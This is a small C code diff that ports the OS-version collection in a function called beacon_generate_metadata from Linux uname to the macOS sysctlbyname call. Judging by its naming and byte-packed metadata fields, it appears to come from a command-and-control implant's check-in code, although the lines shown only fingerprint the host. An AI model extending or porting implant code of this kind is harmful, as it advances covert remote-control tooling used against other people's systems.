@@ -23,6 +23,7 @@
 #include <openssl/hmac.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
+#include <sys/sysctl.h>
 #include <net/if.h>
 #include <ifaddrs.h>
 #include "debug.h"
@@ -208,9 +209,18 @@ uint8_t* beacon_generate_metadata(beacon_state_t *state, size_t *out_len)
     };
     */
 
-    // Parse Linux kernel version (e.g., "5.15.0")
+    // Parse version info
     int major = 0, minor = 0, build = 0;
-    sscanf(uts.release, "%d.%d.%d", &major, &minor, &build);
+    
+    /* macOS: Get the marketing version (e.g., "15.0.1") instead of kernel version from uname() */
+    char os_version[64] = { 0 };
+    size_t os_version_len = sizeof(os_version);
+    if (sysctlbyname("kern.osproductversion", os_version, &os_version_len, NULL, 0) == 0) {
+        sscanf(os_version, "%d.%d.%d", &major, &minor, &build);
+    } else {
+        /* Fallback to uname release if sysctlbyname fails (though it shouldn't on macOS) */
+        sscanf(uts.release, "%d.%d.%d", &major, &minor, &build);
+    }
 
     metadata[offset++] = (uint8_t)major;         // Major version (1 byte) (var1)
     metadata[offset++] = (uint8_t)minor;         // Minor version (1 byte) (var2)
